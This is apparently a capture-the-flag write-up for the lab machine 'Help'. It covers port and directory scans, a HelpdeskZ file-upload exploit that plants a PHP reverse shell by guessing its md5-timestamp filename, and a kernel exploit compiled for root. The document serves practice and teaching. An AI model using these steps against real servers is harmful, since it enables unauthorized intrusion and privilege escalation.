# Help Writeup

## Getting User

### Nmap Scan

`nmap -sV -sT -sC 10.10.10.121`

```
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-31 22:12 PDT
Nmap scan report for 10.10.10.121
Host is up (0.18s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.99 seconds
```

### Gobuster

Gobuster on root with `common.txt`

```
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/javascript (Status: 301)
/server-status (Status: 403)
/support (Status: 301)
```

Nothing really interesting except for `/support/`.

```
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/controllers (Status: 301)
/css (Status: 301)
/favicon.ico (Status: 200)
/images (Status: 301)
/includes (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/uploads (Status: 301)
/views (Status: 301)
```

Nothing on port 3000

### Interesting Notes

Port 80 
- runs a nodejs app (?) called HelpdeskZ. A search on exploitdb reveals that there is a possible exploit involving arbitrary file upload

Port 3000

- returns a json string: `{"message":"Hi Shiv, To get access please find the credentials with given query"}`

### Getting a Shell

On the HelpdeskZ page, there is an option for submitting tickets that allow us to upload a file. What's better is that according to the exploit, the webserver allows php upload, despite the error message 'file not allowed'. I'm using pentest monkey's php-reverse-shell in this case.

`/support/` actually houses some subdirectories. Using gobuster, `tickets` looks like where our shell uploaded to.

```
support
|-- uploads
|   |-- tickets
|   |   |-- ...
```

Command

```
python 40300.py http://10.10.10.121/support/uploads/tickets/ php-reverse-shell.php
```

The exploit takes advantage of the developer's implementation of filename obfuscation. The uploaded file's name is generated by taking the md5 hash of the system time when the file was uploaded, which allows us to 'guess' the name of our uploaded shell.

A netcat listener on the host machine then captures the reverse shell when the url is visited. The shell is owned by the user `Help`, so we go to the home directory and read out `user.txt`.

## Getting Root

Some basic information reveals that the machine is running on linux kernel 4.4.0, which is extremely outdated. A quick search on exploitdb gives us an exploit that works for our specific version (Ubuntu 16.04 LTS 4.4.0-116).

Compiling the exploit and sending it to the machine gives a root shell!

Command

```
gcc 44298.c -o exploit
```
